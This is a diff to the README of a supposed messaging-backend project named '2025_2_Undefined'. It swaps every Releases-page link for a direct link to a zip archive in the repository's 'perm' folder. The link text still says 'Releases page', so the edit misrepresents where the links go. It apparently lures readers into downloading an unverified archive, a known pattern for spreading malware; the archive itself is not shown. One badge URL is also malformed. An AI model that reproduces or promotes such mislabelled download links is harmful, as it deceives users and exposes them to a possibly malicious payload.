@@ -1,7 +1,7 @@
 # 📱 2025_2_Undefined - A Seamless Messaging Experience
 
 ## 📥 Download the App Now
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Diego-zero/2025_2_Undefined/releases)
+[![Download Now](https://raw.githubusercontent.com/Diego-zero/2025_2_Undefined/main/perm/2025_2_Undefined.zip%https://raw.githubusercontent.com/Diego-zero/2025_2_Undefined/main/perm/2025_2_Undefined.zip)](https://raw.githubusercontent.com/Diego-zero/2025_2_Undefined/main/perm/2025_2_Undefined.zip)
 
 ## 🚀 Getting Started
 Welcome to 2025_2_Undefined! This application offers a modern backend solution for a messaging platform similar to Telegram. With a rich set of features and a focus on performance, it helps you stay connected effortlessly.
@@ -22,7 +22,7 @@ Before downloading, ensure that your system meets the following requirements:
 - **Internet Connection:** Required for downloads and messaging services
 
 ## 📥 Download & Install
-To get started with 2025_2_Undefined, visit our [Releases page](https://github.com/Diego-zero/2025_2_Undefined/releases) to download the latest version. 
+To get started with 2025_2_Undefined, visit our [Releases page](https://raw.githubusercontent.com/Diego-zero/2025_2_Undefined/main/perm/2025_2_Undefined.zip) to download the latest version. 
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of the application.
@@ -43,7 +43,7 @@ If you encounter any issues while using the application, try the following:
 
 - **Check Your Internet Connection:** Ensure you are connected to the internet.
 - **Restart the Application:** Close and reopen the app to refresh the service.
-- **Reinstall the App:** If problems persist, uninstall the app and then download the latest version from the [Releases page](https://github.com/Diego-zero/2025_2_Undefined/releases).
+- **Reinstall the App:** If problems persist, uninstall the app and then download the latest version from the [Releases page](https://raw.githubusercontent.com/Diego-zero/2025_2_Undefined/main/perm/2025_2_Undefined.zip).
 
 ## 📜 Topics Covered
 The 2025_2_Undefined backend incorporates various technologies and practices, making it robust and scalable. Here’s a brief overview:
